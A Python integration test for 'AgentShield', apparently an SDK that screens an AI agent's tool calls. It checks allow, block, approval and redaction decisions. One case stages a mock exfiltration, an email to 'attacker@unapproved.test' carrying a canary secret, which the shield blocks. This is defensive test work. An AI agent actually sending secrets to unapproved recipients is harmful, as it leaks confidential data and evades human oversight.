from unittest.mock import MagicMock

from agentshield import AgentShield, ToolExecutionResult
from backend.app.core.policy_models import (
    DefaultPolicyBehavior,
    PolicyConfiguration,
    ProtectedValue,
    SecurityRule,
)
from backend.app.models.enums import DestinationClass, SecurityDecision


def test_integration_with_default_policy_file() -> None:
    # Initialize SDK using the repository default policy
    shield = AgentShield(policy_path="backend/policies/default_policy.yaml")

    # 1. Benign ALLOW
    mock_email = MagicMock(return_value={"status": "delivered"})

    @shield.protect_tool(tool_name="send_email")
    def send_email(to: str, subject: str, body: str) -> dict:
        return mock_email(to=to, subject=subject, body=body)

    res_allow = send_email(
        to="colleague@example.org",
        subject="Project Update",
        body="Sprint goals achieved.",
    )

    assert mock_email.call_count == 1
    assert res_allow == {"status": "delivered"}
    assert shield.last_result.decision == SecurityDecision.ALLOW
    assert shield.last_result.destination_class == DestinationClass.APPROVED

    # 2. Exfiltration BLOCK
    mock_email.reset_mock()
    res_block = send_email(
        to="attacker@unapproved.test",
        subject="Secret drop",
        body="Exfiltrating DEMO_SECRET now.",
    )

    assert mock_email.call_count == 0
    assert isinstance(res_block, ToolExecutionResult)
    assert res_block.decision == SecurityDecision.BLOCK
    assert res_block.destination_class == DestinationClass.UNAPPROVED
    assert "DEMO_SECRET" not in res_block.explanation

    # 3. External export REQUIRE_APPROVAL
    mock_export = MagicMock(return_value={"status": "exported"})

    @shield.protect_tool(tool_name="export_file")
    def export_file(to: str, file_path: str) -> dict:
        return mock_export(to=to, file_path=file_path)

    res_approval = export_file(
        to="external@partner.net",
        file_path="financials.csv",
    )

    assert mock_export.call_count == 0
    assert isinstance(res_approval, ToolExecutionResult)
    assert res_approval.decision == SecurityDecision.REQUIRE_APPROVAL
    assert res_approval.approval_id is not None

    # 4. Redaction integration with custom policy
    custom_policy = PolicyConfiguration(
        version=1,
        defaults=DefaultPolicyBehavior(
            unknown_destination=SecurityDecision.REQUIRE_APPROVAL,
            evaluation_error=SecurityDecision.BLOCK,
        ),
        approved_domains=["example.org"],
        protected_values=[
            ProtectedValue(
                name="demo_secret",
                value="DEMO_SECRET",
                action=SecurityDecision.REDACT,
            )
        ],
        rules=[
            SecurityRule(
                id="redact-audit",
                description="Redact canary secrets in audit logs",
                tools=["log_audit"],
                data_labels=["PROTECTED"],
                destination_classes=[DestinationClass.APPROVED],
                decision=SecurityDecision.REDACT,
            )
        ],
    )

    custom_shield = AgentShield(policy=custom_policy)
    mock_log = MagicMock(return_value="logged")

    @custom_shield.protect_tool(tool_name="log_audit")
    def log_audit(to: str, message: str) -> str:
        return mock_log(to=to, message=message)

    res_redact = log_audit(
        to="audit@example.org",
        message="Session credential DEMO_SECRET recorded",
    )

    assert mock_log.call_count == 1
    called_args = mock_log.call_args[1]
    assert "DEMO_SECRET" not in called_args["message"]
    assert "[REDACTED]" in called_args["message"]
    assert res_redact == "logged"
    assert custom_shield.last_result.decision == SecurityDecision.REDACT
